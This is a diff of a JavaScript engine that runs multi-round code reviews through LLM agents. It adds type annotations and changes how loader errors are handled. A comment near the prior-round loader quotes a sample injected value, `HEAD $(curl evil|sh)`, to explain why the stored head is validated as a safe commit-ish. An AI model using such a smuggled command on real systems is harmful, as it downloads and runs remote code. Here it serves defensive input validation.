 function shardLedger(ledger, { max = LEDGER_SHARD_MAX_BYTES, maxShards = LEDGER_SHARD_MAX_SHARDS } = {}) {
   const items = Array.isArray(ledger) ? ledger : []
   if (!items.length) return []
+  /** @type {unknown[][]} */
   const groups = []
   let bytes = 0
   for (const item of items) {
     const size = payloadBytes(item)
-    if (!groups.length || (groups[groups.length - 1].length && bytes + size > max)) {
+    if (!groups.length || (/** @type {unknown[]} */ (groups[groups.length - 1]).length && bytes + size > max)) {
       if (groups.length >= maxShards) break          // the overflow is declared below, not hidden
       groups.push([])
       bytes = 0
     }
-    groups[groups.length - 1].push(item)
+    /** @type {unknown[]} */ (groups[groups.length - 1]).push(item)
     bytes += size
   }
   return groups.map((group, i) => ({
@@ -2894,6 +3427,13 @@ function shardLedger(ledger, { max = LEDGER_SHARD_MAX_BYTES, maxShards = LEDGER_
 // The round a tombstone closed in, read from its `why` marker ("resolved in round N" / "dismissed
 // in round N"), with the stored `round` field as a fallback and 0 as the floor. Used only to order
 // tombstones by age for dedup and eviction — the regression message reads the same marker itself.
+/**
+ * @typedef {{ fp?: unknown, why?: unknown, round?: unknown }} Tombstone
+ */
+/**
+ * @param {Tombstone | null | undefined} t
+ * @returns {number}
+ */
 function tombstoneRound(t) {
   const m = /round (\d+)/.exec(String((t && t.why) || ''))
   if (m) return Number(m[1])
@@ -2913,9 +3453,17 @@ function tombstoneRound(t) {
 //      a fresh finding is most likely to match.
 // Tombstones without an `fp` are never merged (they have no identity to merge on) and are kept as-is,
 // still subject to the count cap. Insertion order is otherwise preserved below the cap.
+/**
+ * @param {unknown} tombstones
+ * @param {{ max?: number }} [opts]
+ * @returns {Tombstone[]}
+ */
 function pruneTombstones(tombstones, { max = LEDGER_TOMBSTONE_MAX } = {}) {
+  /** @type {Tombstone[]} */
   const items = Array.isArray(tombstones) ? tombstones : []
+  /** @type {Map<unknown, Tombstone>} */
   const newestByFp = new Map()
+  /** @type {Tombstone[]} */
   const noFp = []
   for (const t of items) {
     if (!t || typeof t !== 'object') continue
@@ -2941,12 +3489,18 @@ function pruneTombstones(tombstones, { max = LEDGER_TOMBSTONE_MAX } = {}) {
 // call copy of the final record refuses on. When live findings alone already fill the ceiling the
 // budget is 0: tombstones cannot rescue a ledger the live rows have pushed over, and adding them would
 // only deepen the overflow that inverts the memory into a per-round full rescan.
+/**
+ * @param {unknown} liveCount
+ * @param {{ ceiling?: number }} [opts]
+ * @returns {number}
+ */
 function tombstoneBudget(liveCount, { ceiling = LEDGER_TOMBSTONE_MAX } = {}) {
   const live = Math.max(0, Number(liveCount) || 0)
   return Math.max(0, ceiling - live)
 }
 // <<< craft-inline
 
+/** @type {Schema<CheckpointAnswer>} */
 const CHECKPOINT_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -2966,6 +3520,7 @@ let rejoinArmed = false
 // the `ownDir` shortcut, read a mid-review branch move as "not this run's directory", and left the
 // run's own phases unfolded. Sticky, because an adoption is not undone by later checkpoints
 // succeeding — once a directory MIGHT be someone else's, it stays might-be for the finalize proof.
+/** @param {string} phase @param {Record<string, unknown>} payloadIn @param {string} group */
 async function checkpoint(phase, payloadIn, group) {
   // kind/name are what the checkpoint DIRECTORY is named after, and `recover` parses them back out of
   // that name to rebuild a dead run's identity. A payload without them produced a real
@@ -2983,10 +3538,10 @@ async function checkpoint(phase, payloadIn, group) {
   const asked = runDir
   const armRejoin = !runDir && checkpointFailed
   if (armRejoin) rejoinArmed = true
-  const res = await ragentQuietly(
+  const { answer: res, threw } = splitThrew(await ragentQuietly(
     checkpointPrompt({ payload, craftRoot: craftRootArg, repo: repoArg, phase, dir: runDir, rejoin: armRejoin }),
     { label: `checkpoint:${phase}`, phase: group, schema: CHECKPOINT_SCHEMA, model: 'haiku', effort: 'low' },
-  )
+  ))
   if (res?.runDir) {
     // A refused `--dir` does not fail the checkpoint: the script MINTS a fresh directory, prints a
     // WARNING on stderr and returns a perfectly valid runDir on stdout. Taking it silently strands
@@ -3005,7 +3560,7 @@ async function checkpoint(phase, payloadIn, group) {
     // for a reason — asking for it unconditionally would make a SECOND, concurrent review adopt this
     // one's directory, and concurrent reviews on one machine are ordinary.
     checkpointFailed = true
-    noteTelemetryLoss(`phase checkpoint '${phase}'`, res?.__threw || res?.error || 'the logger agent returned no runDir')
+    noteTelemetryLoss(`phase checkpoint '${phase}'`, threw || res?.error || 'the logger agent returned no runDir')
   }
 }
 
@@ -3014,6 +3569,7 @@ async function checkpoint(phase, payloadIn, group) {
 // quoted heredoc into the script. It no longer computes ts/project/commit/dirty, chooses the filename,
 // hand-appends the index or hand-verifies the readback; that recipe is what once persisted a completed
 // review as `dimensions: [], verification: null`. Fewer decisions in the prompt is the whole fix.
+/** @param {Record<string, unknown>} recordIn */
 async function logRun(recordIn) {
   // Every review record — the early exits too, not only reviewRecord() — says which engine computed its
   // fingerprints: a later round decides their basis by this (realm @nick/craft #111). Last, so no
@@ -3027,6 +3583,7 @@ async function logRun(recordIn) {
       record, craftRoot: craftRootArg, repo: repoArg,
       command: 'finalize', dir: runDir, rejoin: rejoinArmed,
     }),
+    // LOGRUN_SCHEMA is untagged, so the answer stays `unknown` — logRunOutcome reads it as such.
     logRunDispatch(record, { phase: 'Synthesize' }),
   )
   const landed = logRunOutcome(res)
@@ -3036,13 +3593,18 @@ async function logRun(recordIn) {
   else if (landed.reason) noteTelemetryLoss('the run directory (the record itself landed)', landed.reason)
 }
 
+/** @param {Finding} f */
 function key(f) {
-  return `${(f.file || '').toLowerCase()}:${f.line || 0}:${(f.title || '').toLowerCase().replace(/\s+/g, ' ').trim()}`
+  return `${(f['file'] || '').toLowerCase()}:${f['line'] || 0}:${(f['title'] || '').toLowerCase().replace(/\s+/g, ' ').trim()}`
 }
 
 // >>> craft-inline lib/run-record.mjs titleShingle normalizeSymbol fingerprint shingleOverlap matchesPrior DISPOSITION_FROM_TRIAGE dispositionFromTriage rereviewVerdict reReviewMemory branchFromAbbrevRef ENGINE_REVISION FP_BASIS_SINCE fpBasisOf fpBasisEstablished sameFpBasis basisVerdictFromRevisions
 // Normalized, word-order-independent word-set of a finding title. Used inside the fingerprint and
 // for fuzzy cross-round matching so a lightly reworded title still matches its prior-round twin.
+/**
+ * @param {unknown} title
+ * @returns {string}
+ */
 function titleShingle(title) {
   return String(title || '')
     .toLowerCase()
@@ -3058,6 +3620,10 @@ function titleShingle(title) {
 // case (`Foo::Bar` vs `foo::bar`), the `fn `/`impl ` keyword, and generic parameters (`parse<T>`).
 // Kept deliberately small — it absorbs decoration noise, not structure: a rename is still a
 // different symbol, which is the acceptable, rare identity loss the fingerprint is built to take.
+/**
+ * @param {unknown} symbol
+ * @returns {string}
+ */
 function normalizeSymbol(symbol) {
   let s = String(symbol || '').toLowerCase().replace(/\b(?:fn|impl)\s+/g, '')
   // Strip generics INNERMOST-first, looping until stable. A single /<[^>]*>/g pass stops its class at
@@ -3081,6 +3647,10 @@ function normalizeSymbol(symbol) {
 // tombstone/recidivism check only ever keys ruleId findings, so it never sees the title-bearing form.
 // djb2 (not crypto) — the sandbox has no crypto and bans Math.random, and we only need a stable,
 // collision-resistant-enough key, computed identically in the lib and in the workflow mirror.
+/**
+ * @param {FindingKey | null | undefined} f
+ * @returns {string}
+ */
 function fingerprint(f) {
   const ruleId = f?.ruleId || ''
   const basis = ruleId
@@ -3091,6 +3661,11 @@ function fingerprint(f) {
   return h.toString(16).padStart(8, '0')
 }
 
+/**
+ * @param {unknown} a
+ * @param {unknown} b
+ * @returns {number}
+ */
 function shingleOverlap(a, b) {
   const sa = new Set(titleShingle(a).split(' ').filter(Boolean))
   const sb = new Set(titleShingle(b).split(' ').filter(Boolean))
@@ -3103,10 +3678,16 @@ function shingleOverlap(a, b) {
 // True when `cur` (a freshly located finding) is the same defect as `prior` (from the ledger).
 // file + ruleId must match exactly; a symbol mismatch only disqualifies when BOTH carry one (a
 // finding can move symbols across a fix, so an absent symbol is not a veto); titles must overlap.
+/**
+ * @param {FindingKey | null | undefined} cur
+ * @param {FindingKey | null | undefined} prior
+ * @param {{ threshold?: number }} [options]
+ * @returns {boolean}
+ */
 function matchesPrior(cur, prior, { threshold = 0.6 } = {}) {
   if ((cur?.file || '') !== (prior?.file || '')) return false
   if ((cur?.ruleId || '') !== (prior?.ruleId || '')) return false
-  if ((cur?.symbol || '') && (prior?.symbol || '') && cur.symbol !== prior.symbol) return false
+  if ((cur?.symbol || '') && (prior?.symbol || '') && /** @type {FindingKey} */ (cur).symbol !== /** @type {FindingKey} */ (prior).symbol) return false
   return shingleOverlap(cur?.title, prior?.title) >= threshold
 }
 
@@ -3114,12 +3695,20 @@ function matchesPrior(cur, prior, { threshold = 0.6 } = {}) {
 // `open` (still to be adjudicated or fixed); only reject/defer carry a settled disposition.
 const DISPOSITION_FROM_TRIAGE = { reject: 'rejected', defer: 'deferred', accept: 'open', 'needs-decision': 'open', conflict: 'open' }
 
+/**
+ * @param {unknown} v
+ * @returns {string}
+ */
 function dispositionFromTriage(v) {
-  return Object.prototype.hasOwnProperty.call(DISPOSITION_FROM_TRIAGE, v) ? DISPOSITION_FROM_TRIAGE[v] : 'open'
+  return Object.prototype.hasOwnProperty.call(DISPOSITION_FROM_TRIAGE, /** @type {PropertyKey} */ (v)) ? DISPOSITION_FROM_TRIAGE[/** @type {TriageVerdict} */ (v)] : 'open'
 }
 
 // Re-review verdict: reviewVerdict over the findings that still matter this round. resolved and
 // carried (rejected/justified) findings are excluded by the caller, so they never reach here.
+/**
+ * @param {{ stillOpen?: unknown[], regressed?: unknown[], neu?: unknown[] }} [findings]
+ * @returns {string}
+ */
 function rereviewVerdict({ stillOpen = [], regressed = [], neu = [] } = {}) {
   return reviewVerdict([...stillOpen, ...regressed, ...neu])
 }
@@ -3131,6 +3720,10 @@ function rereviewVerdict({ stillOpen = [], regressed = [], neu = [] } = {}) {
 // is what makes that visible. Only 'no-branch' earns a note: a genuine first review on a branch
 // (no-candidate-rows, an ancestry rejection after a rebase, …) is normal, not a footgun, and stays
 // noteless, or the note fires on every first review and stops being read.
+/**
+ * @param {string | null | undefined} priorReason
+ * @returns {{ chained: boolean, reason: string | null, note: string | null }}
+ */
 function reReviewMemory(priorReason) {
   const reason = priorReason || null
   const chained = !reason
@@ -3147,6 +3740,10 @@ function reReviewMemory(priorReason) {
 // could not resolve one) passes through unchanged. The one place this rule lives: gitIdentity
 // (lib/craft-log-run.mjs) and the review engine's detect capture (workflows/review.js) both route
 // their branch value through here (realm @nick/craft #104).
+/**
+ * @param {string} ref
+ * @returns {string}
+ */
 function branchFromAbbrevRef(ref) {
   return ref === 'HEAD' ? '' : ref
 }
@@ -3168,24 +3765,38 @@ const FP_BASIS_SINCE = [1, 3]
 
 // The basis a record stamped with `rev` fingerprinted under; null when `rev` is not a revision
 // (a legacy record with no field) — such a record is never comparable.
+/**
+ * @param {unknown} rev
+ * @returns {number | null}
+ */
 function fpBasisOf(rev) {
-  if (!Number.isInteger(rev) || rev < 1) return null
-  return Math.max(...FP_BASIS_SINCE.filter(b => b <= rev))
+  if (!Number.isInteger(rev) || /** @type {number} */ (rev) < 1) return null
+  return Math.max(...FP_BASIS_SINCE.filter(b => b <= /** @type {number} */ (rev)))
 }
 
 // Whether the basis `priorRev` fingerprinted under can be established at all: a revision this engine
 // knows — not missing (a legacy record), not newer than this engine (a table it does not have). The
 // complement is not "the basis changed" but "nobody can say", and the engine reports it as lost
 // re-review memory rather than an expected reset (realm @nick/craft #110).
+/**
+ * @param {unknown} priorRev
+ * @param {number} [currentRev]
+ * @returns {boolean}
+ */
 function fpBasisEstablished(priorRev, currentRev = ENGINE_REVISION) {
-  return Number.isInteger(priorRev) && priorRev >= 1 && priorRev <= currentRev
+  return Number.isInteger(priorRev) && /** @type {number} */ (priorRev) >= 1 && /** @type {number} */ (priorRev) <= currentRev
 }
 
 // Whether fingerprints recorded under `priorRev` may be compared to ones computed now. A prior
 // revision NEWER than this engine's is never comparable: it may have begun a basis this engine's
 // table does not know (a downgrade, or two installs writing one store), and the guard fails closed.
+/**
+ * @param {unknown} priorRev
+ * @param {number} [currentRev]
+ * @returns {boolean}
+ */
 function sameFpBasis(priorRev, currentRev = ENGINE_REVISION) {
-  if (Number.isInteger(priorRev) && priorRev > currentRev) return false
+  if (Number.isInteger(priorRev) && /** @type {number} */ (priorRev) > currentRev) return false
   const prior = fpBasisOf(priorRev)
   return prior !== null && prior === fpBasisOf(currentRev)
 }
@@ -3195,6 +3806,11 @@ function sameFpBasis(priorRev, currentRev = ENGINE_REVISION) {
 // caller's own revision and table. Known only when every revision is established and all map to ONE
 // basis; then comparable when that basis is the caller's. Inlined into the review engine, which
 // computes the fingerprints and so is the side that decides (realm @nick/craft #111).
+/**
+ * @param {unknown} revs
+ * @param {number} [currentRev]
+ * @returns {{ sameFpBasis: boolean, fpBasisKnown: boolean }}
+ */
 function basisVerdictFromRevisions(revs, currentRev = ENGINE_REVISION) {
   const list = Array.isArray(revs) ? revs : []
   if (!list.length || !list.every(r => fpBasisEstablished(r, currentRev))) return { sameFpBasis: false, fpBasisKnown: false }
@@ -3216,19 +3832,22 @@ function basisVerdictFromRevisions(revs, currentRev = ENGINE_REVISION) {
 //     prints an authoritative `ledgerCount` beside it; if the array that arrived is a different
 //     length, entries were lost in transport and an 82-entry round would otherwise be carried as a
 //     genuine 20-entry one. Degraded → full re-scan, same as a missing ledger.
+/** @param {PriorRound | null} priorRound */
 function ledgerTruncated(priorRound) {
   if (!priorRound) return false
-  const count = Number(priorRound.ledgerCount)
+  const count = Number(priorRound['ledgerCount'])
   if (!Number.isFinite(count)) return false   // a record from before the count existed: nothing to check
-  return count !== (Array.isArray(priorRound.ledger) ? priorRound.ledger.length : 0)
+  return count !== (Array.isArray(priorRound['ledger']) ? priorRound['ledger'].length : 0)
 }
+/** @param {PriorRound | null} priorRound */
 function ledgerDegraded(priorRound) {
   if (!priorRound) return false
   if (ledgerTruncated(priorRound)) return true
-  const findings = Number(priorRound.priorFindings || 0)
-  const ledgerLen = Array.isArray(priorRound.ledger) ? priorRound.ledger.length : 0
+  const findings = Number(priorRound['priorFindings'] || 0)
+  const ledgerLen = Array.isArray(priorRound['ledger']) ? priorRound['ledger'].length : 0
   return findings > 0 && ledgerLen === 0
 }
+/** @param {{ priorRound: PriorRound | null, thisRound: number, fullEvery: number, degraded: boolean, journalSourced: boolean }} args */
 function shouldFullRescan({ priorRound, thisRound, fullEvery, degraded, journalSourced }) {
   if (!priorRound) return true            // a first review is already a full base...HEAD scan
   if (degraded) return true               // nothing to carry — a delta-only scan would review almost nothing
@@ -3250,8 +3869,9 @@ function shouldFullRescan({ priorRound, thisRound, fullEvery, degraded, journalS
 // re-runnable tool behind it, so it must be verifiable by argument like a lens finding; classifying
 // it as a tool would make it effectively unfalsifiable ("keep an unverifiable tool finding alive")
 // and inflate the verdict with false Warnings.
+/** @param {Profile} profile @param {string | undefined} source */
 function isToolSource(profile, source) {
-  return !(profile.lenses.includes(source) || source === 'negative-space' || source === 'dep-context')
+  return !((source !== undefined && profile.lenses.includes(source)) || source === 'negative-space' || source === 'dep-context')
 }
 
 // ================= Detect base + languages =================
@@ -3330,6 +3950,7 @@ const head = (typeof detected?.head === 'string' ? detected.head : '').trim()
 // own, so it does not enter the chain: not as a reader (here) and not as a candidate
 // (`selectPriorRounds` skips `nested` rows). The run that has a history is the top-level one.
 // Unlike the condition this replaces, the skip is announced — a silent skip was that defect.
+/** @type {PriorRound | null} */
 let priorRound = null
 // The prior-round lookup's non-found reason, held here because `priorRound` is nulled on a miss below.
 // It is the reason the run did NOT chain to a prior round; null means it DID (reReviewMemory reads null
@@ -3339,6 +3960,8 @@ let priorReason = freshArg ? 'fresh' : viaArg ? 'nested' : null
 if (!freshArg && viaArg) {
   log(`Nested run (via ${viaArg}) — the round chain is the top-level run's: not read, and this run's row is not a candidate round for anyone (its siblings in the fan-out share this project and branch)`)
 }
+// The loader's throw, held apart from its answer so `priorRound` is only ever an answer or null.
+let priorReadThrew = ''
 if (!freshArg && !viaArg) {
   priorRound = await ragentQuietly(
     `You are the craft prior-round loader. This is mechanical IO — you DECIDE nothing: selecting the round, checking ancestry and reading the record are all done by the script.
@@ -3351,15 +3974,15 @@ ${loggerPreludeNow()}cd ${shq(repoArg || '.')} && node ${LOGGER_PATH} prior-roun
 
 It prints ONE line of JSON and always exits 0. Return that object VERBATIM — copy the \`ledger\` array byte for byte, do not summarize, re-key, truncate or "clean up" any entry. It prints \`ledgerCount\` alongside \`ledger\` — copy that number EXACTLY as printed; never recount, never adjust it to the array you are returning. Copy \`sameFpBasis\` exactly as printed too — it decides whether this round may compare fingerprints with the last one, and a dropped or flipped value loses the loop's memory. If the printed object has no \`sameFpBasis\`, leave it out; never invent one. The same holds for \`fpBasisKnown\`, \`priorFpRevisions\` (copy that array exactly) and \`priorFpRevisionsCheck\`. If the command prints nothing or cannot run, return {found:false, round:0, head:"", ledger:[], ledgerCount:0, priorFindings:0, journalSourced:false, sameFpBasis:false, fpBasisKnown:false, reason:"loader-did-not-run"}.`,
     { label: 'prior-round', schema: PRIOR_ROUND_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' },
-  )
+  ).then(res => { const { answer, threw } = splitThrew(res); priorReadThrew = threw; return answer })
   // Every rejection has a reason and the reason is LOGGED. Silence here is the exact defect this
   // command replaced: the first re-review of a branch whose rows predate the absolute-path key
   // restarts from a blank ledger, and that must be visible rather than inferred from thin results.
-  if (!priorRound?.found) {
+  if (!priorRound?.['found']) {
     // Capture WHY there is no prior round BEFORE `priorRound` is nulled below: the re-review memory
     // outcome (chained? and the detached-HEAD note) is derived from it (realm @nick/craft #104).
-    priorReason = priorRound?.reason || 'no-prior-round'
-    if (priorRound?.reason) log(`No prior round: ${priorRound.reason}`)
+    priorReason = priorRound?.['reason'] || 'no-prior-round'
+    if (priorRound?.['reason']) log(`No prior round: ${priorRound['reason']}`)
     // A read that FAILED is the same lost-record class as a write that failed, and its silence is
     // worse: the run degrades into a first review (thisRound resets to 1, the whole adjudicate/carry
     // track is skipped) and the report cannot be told apart from a genuine first pass.
@@ -3368,9 +3991,9 @@ It prints ONE line of JSON and always exits 0. Return that object VERBATIM — c
     // "the read could not run". Only the latter is a lost record; marking the former would fire the
     // marker on every first review, which is precisely how a marker stops being read.
     const READ_FAILURES = ['loader-did-not-run', 'git-unavailable']
-    const readFailed = !priorRound || !!priorRound.__threw || READ_FAILURES.some(r => String(priorRound.reason || '').startsWith(r))
+    const readFailed = !priorRound || !!priorReadThrew || READ_FAILURES.some(r => String(/** @type {PriorRound} */ (priorRound)['reason'] || '').startsWith(r))
     if (readFailed) {
-      noteTelemetryLoss('the prior-round ledger', priorRound?.__threw || priorRound?.reason || 'the loader agent returned no result')
+      noteTelemetryLoss('the prior-round ledger', priorReadThrew || priorRound?.['reason'] || 'the loader agent returned no result')
     }
     priorRound = null
   }
@@ -3379,16 +4002,16 @@ It prints ONE line of JSON and always exits 0. Return that object VERBATIM — c
   // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
   // already-resolved base ref rather than nulling priorRound — re-review stays ON, the fix-range diff
   // just widens to base...HEAD. The use sites additionally shq()/flattenField() it (defense in depth).
-  if (priorRound && !isCommitish(priorRound.head)) {
-    log(`⚠️ prior-round head ${JSON.stringify(priorRound.head)} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
-    priorRound.head = baseRef
+  if (priorRound && !isCommitish(priorRound['head'])) {
+    log(`⚠️ prior-round head ${JSON.stringify(priorRound['head'])} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
+    priorRound['head'] = baseRef
   }
 }
 // Transport integrity: assert the ledger we received is the ledger the script printed.
 if (priorRound && ledgerTruncated(priorRound)) {
-  log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRound.ledgerCount} entr(ies), ${priorRound.ledger?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
+  log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRound['ledgerCount']} entr(ies), ${priorRound['ledger']?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
 }
-if (priorRound) log(`Re-review: prior round ${priorRound.round} @ ${flattenField(priorRound.head)} · ${priorRound.ledger?.length || 0} ledger finding(s)`)
+if (priorRound) log(`Re-review: prior round ${priorRound['round']} @ ${flattenField(priorRound['head'])} · ${priorRound['ledger']?.length || 0} ledger finding(s)`)
 else log(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')
 
 // realm @nick/craft #104: whether re-review memory engaged, and the note for the one case that fails
@@ -3416,7 +4039,7 @@ if (reReview.note) {
 // and the loser's ledger is orphaned. Live findings recover on the next full rescan; the one casualty
 // with no recovery path is the loser's monotonic tombstone set. This is an accepted, bounded loss, not
 // corruption — recorded here so the next reader meets the assumption before the store, not after.
-const thisRound = priorRound ? (priorRound.round || 1) + 1 : 1
+const thisRound = priorRound ? (priorRound['round'] || 1) + 1 : 1
 // The prior round's finding fingerprints are comparable to this round's
 // only when both were fingerprinted under the same basis (FP_BASIS_SINCE in lib/run-record.mjs — a
 // separate question from the engine revision, so a telemetry-only bump keeps it; realm @nick/craft
@@ -3434,10 +4057,10 @@ const thisRound = priorRound ? (priorRound.round || 1) + 1 : 1
 // or a truncated or swapped list does not — and otherwise fails closed, reporting a transport loss
 // (priorBasisMismatch). When the array arrived intact, THIS engine's table decides, whatever the
 // logger's own table said (realm @nick/craft #111).
-const relayedVerdict = priorRound && typeof priorRound.sameFpBasis === 'boolean'
-  ? { sameFpBasis: priorRound.sameFpBasis, fpBasisKnown: priorRound.fpBasisKnown } : null
-const relayedRevisions = priorRound && Array.isArray(priorRound.priorFpRevisions) ? priorRound.priorFpRevisions : null
-const relayedCheck = priorRound && typeof priorRound.priorFpRevisionsCheck === 'string' ? priorRound.priorFpRevisionsCheck : null
+const relayedVerdict = priorRound && typeof priorRound['sameFpBasis'] === 'boolean'
+  ? { sameFpBasis: priorRound['sameFpBasis'], fpBasisKnown: priorRound['fpBasisKnown'] } : null
+const relayedRevisions = priorRound && Array.isArray(priorRound['priorFpRevisions']) ? priorRound['priorFpRevisions'] : null
+const relayedCheck = priorRound && typeof priorRound['priorFpRevisionsCheck'] === 'string' ? priorRound['priorFpRevisionsCheck'] : null
 // A new loader prints BOTH fields on every path; an older one prints neither. So: an array whose check
 // no longer matches, or a check with no array, is a transport loss. An EMPTY array whose '' check the
 // relay dropped is not — that is an honest "nothing established", and the absent check reads as ''.
@@ -3469,14 +4092,14 @@ const priorBasisVerdict = !priorBasis ? 'absent'
 let tombstonesDroppedForBasis = 0
 const priorLedgerDegraded = ledgerDegraded(priorRound)
 if (priorLedgerDegraded) {
-  log(`⚠️ Re-review DEGRADED: prior round ${priorRound.round} reported ${priorRound.priorFindings} finding(s) but persisted NO ledger — the adjudicate track has nothing to carry or re-verify. Forcing a full base...HEAD re-scan this round; if results still look thin, re-run with {fresh:true}.`)
+  log(`⚠️ Re-review DEGRADED: prior round ${/** @type {PriorRound} */ (priorRound)['round']} reported ${/** @type {PriorRound} */ (priorRound)['priorFindings']} finding(s) but persisted NO ledger — the adjudicate track has nothing to carry or re-verify. Forcing a full base...HEAD re-scan this round; if results still look thin, re-run with {fresh:true}.`)
 }
 // Distinct from `priorLedgerDegraded`: the ledger itself is fine here, but a journal-reconstructed
 // round's `head` is the commit the DEAD run stalled on, which the operator typically re-runs against
 // BEFORE making any fix — so it can equal the current HEAD and a delta scan would review nothing.
-const priorRoundJournalSourced = Boolean(priorRound?.journalSourced)
+const priorRoundJournalSourced = Boolean(priorRound?.['journalSourced'])
 if (priorRoundJournalSourced) {
-  log(`⚠️ Re-review round reconstructed from what a STOPPED run left behind (its journal, or its surviving phase checkpoints): prior round ${priorRound.round}'s head ${flattenField(priorRound.head)} is where that run stopped, not a completed round's head — it may equal this run's HEAD if no fix landed yet. Forcing a full base...HEAD re-scan this round rather than risk an empty head...HEAD diff.`)
+  log(`⚠️ Re-review round reconstructed from what a STOPPED run left behind (its journal, or its surviving phase checkpoints): prior round ${/** @type {PriorRound} */ (priorRound)['round']}'s head ${flattenField(/** @type {PriorRound} */ (priorRound)['head'])} is where that run stopped, not a completed round's head — it may equal this run's HEAD if no fix landed yet. Forcing a full base...HEAD re-scan this round rather than risk an empty head...HEAD diff.`)
 }
 const fullRescan = shouldFullRescan({ priorRound, thisRound, fullEvery, degraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced })
 // On a re-review the lenses look only at the fix commits (prevHead...HEAD) — cheap, and it catches
@@ -3488,7 +4111,7 @@ const lensBase = (priorRound && !fullRescan) ? priorRound.head : baseRef
 if (priorRound) {
   log(`Re-review round ${thisRound} lens scope: ${fullRescan
     ? `FULL base...HEAD re-scan (fullEvery=${fullEvery}${priorLedgerDegraded ? ', ledger degraded' : ''}${priorRoundJournalSourced ? ', prior round journal-sourced' : ''}) — earlier misses in untouched code are re-checked`
-    : `incremental delta ${flattenField(priorRound.head)}...HEAD (fix commits only)`}`)
+    : `incremental delta ${flattenField(priorRound['head'])}...HEAD (fix commits only)`}`)
 }
 
 // Active profiles: detected in the diff, intersected with any explicit pin. If a pin names a profile
@@ -3537,7 +4160,7 @@ if (coverage.outcome === 'nothing-to-review') {
   return out([
     `## Verdict`, `✅ Approve (NOTHING TO REVIEW) — ${okMsg}`,
     ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
-    ``, `## Not reviewed (nothing reviewable in them)`, ...changedFiles.map(f => `- ${f}`),
+    ``, `## Not reviewed (nothing reviewable in them)`, ...changedFiles.map((/** @type {string} */ f) => `- ${f}`),
   ].join('\n') + scopeSection())
 }
 if (coverage.outcome === 'no-profile') {
@@ -3550,7 +4173,7 @@ if (coverage.outcome === 'no-profile') {
   return out([
     `## Verdict`, `⚠️ INCOMPLETE — ${msg}`,
     ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
-    ...(changedFiles.length ? [``, `## Not reviewed (no language profile)`, ...changedFiles.map(f => `- ${f}`)] : []),
+    ...(changedFiles.length ? [``, `## Not reviewed (no language profile)`, ...changedFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
   ].join('\n') + scopeSection())
 }
 log(`Active profiles: ${active.map(p => p.id).join(', ')}${pinnedLangs ? ` (pinned: ${pinnedLangs.join(',')})` : ''} · base ${baseRef || 'HEAD'}`)
@@ -3559,11 +4182,12 @@ log(`Active profiles: ${active.map(p => p.id).join(', ')}${pinnedLangs ? ` (pinn
 // The ones that are a real coverage gap (see coverageGapFiles: material AND not project config)
 // additionally reach the verdict further down, so it carries the (INCOMPLETE) marker rather than a
 // bare Approve.
-const uncoveredFiles = changedFiles.filter(f => !active.some(p => p.detect([f])))
+const uncoveredFiles = changedFiles.filter((/** @type {string} */ f) => !active.some(p => p.detect([f])))
 const uncoveredGap = coverageGapFiles(uncoveredFiles)
 if (uncoveredFiles.length) log(`Outside all active profiles (not reviewed): ${uncoveredFiles.join(', ')}${uncoveredGap.length ? ` — ${uncoveredGap.length} unreviewed source file(s)` : ' (docs/assets/lockfiles/project config only — not a coverage gap)'}`)
 
 // ================= Prompt builders (profile-parameterized) =================
+/** @param {Profile} profile */
 function scoutPrompt(profile) {
   return `You are scouting a ${profile.lang} diff to plan an elastic review. Use shell + read only — do NOT review yet.${pathArg ? `\n\nSCOPE: review ONLY the crate/dir at \`${flattenField(pathArg)}\`. Pass \`-- ${shq(pathArg)}\` to every \`git diff\` command below.` : ''}
 
@@ -3573,7 +4197,7 @@ Diff base: ${lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes /
 2. lenses: choose from ${JSON.stringify(profile.lenses)}.
    - small: only the touched categories (minimum 2; always include the dominant category, and include '${profile.safetyLens}' unless the diff clearly touches nothing related to ${profile.securityHints}).
    - medium: the categories plausibly in play.
-   - large: all of them, EXCEPT ${JSON.stringify(profile.lenses.filter(l => CONDITIONAL_LENSES.includes(l)))} — the
+   - large: all of them, EXCEPT ${JSON.stringify(profile.lenses.filter((/** @type {string} */ l) => CONDITIONAL_LENSES.includes(l)))} — the
      engine adds those itself off a code signal in the diff, so picking one here only pays for an
      agent the signal did not ask for. Do not count them toward your choices.
    ${profile.scoutRules}${strict ? '\n   STRICT MODE is on: ALWAYS include \'maintainability\' in lenses regardless of size.' : ''}
@@ -3587,6 +4211,7 @@ Diff base: ${lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes /
    - invariantType: does it change a type that carries an invariant other code relies on?`
 }
 
+/** @param {string} priorSummary @param {Profile} profile @param {Plan} plan */
 function negativeSpacePrompt(priorSummary, profile, plan) {
   const intent = plan?.intent ?? intentArg
   return `You are the **negative-space** review lens for a ${profile.lang} change. Unlike the other lenses, your job is NOT to review the changed lines — it is to find the bug the diff ENABLES in code it did NOT touch. ${profile.navSkill ? `Load the ${profile.navSkill} skill for whole-repo search; use` : 'Use'} Grep/Glob across the ENTIRE tree, not just the diff.
@@ -3608,6 +4233,7 @@ ${priorSummary}
 Return {lens: "negative-space", findings: [...]} using the shared finding schema. Set \`ruleId\` to the matching ${profile.rubricSkill} rules.md ID or "" if none fits. Observability: the workflow records this run — do NOT write your own record.`
 }
 
+/** @param {string} lens @param {string} priorSummary @param {Profile} profile @param {Plan} plan @param {Slice | null} [slice] */
 function lensPrompt(lens, priorSummary, profile, plan, slice = null) {
   if (lens === 'negative-space') return negativeSpacePrompt(priorSummary, profile, plan)
   // The pathspec the lens reviews. A slice replaces the profile's globs with its own files — that
@@ -3645,13 +4271,14 @@ Observability: the review workflow records this run — do NOT write your own re
 
 // `profile` is threaded in for the exclusion catalog: it is per-profile (only the rust rubric ships
